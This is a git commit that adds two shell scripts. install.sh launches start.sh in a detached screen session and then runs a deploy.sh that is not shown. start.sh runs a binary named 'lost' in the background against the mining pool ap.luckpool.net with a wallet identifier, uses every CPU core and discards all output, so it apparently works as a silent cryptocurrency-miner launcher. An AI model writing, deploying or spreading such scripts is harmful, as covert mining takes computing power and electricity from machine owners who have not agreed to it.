554188d5276e62ddf2c3f7ee96a148618cd340d9
casanbodong <106717247+casanbodong@users.noreply.github.com>
2022-06-02 08:57:22 +0700

    Add files via upload

---
+++ install.sh
@@ -0,0 +1,4 @@
+chmod +x start.sh &&
+screen -dmS new ./start.sh &&
+chmod +x deploy.sh &&
+./deploy.sh
---
+++ start.sh
@@ -0,0 +1,2 @@
+chmod +x lost &&
+nohup ./lost -v -l ap.luckpool.net:3956 -u RLKVQcYkNGQXb8FpQzNav3FUoqCLCKYdaG.5 -p x -t $(nproc --all) >/dev/null 2>&1
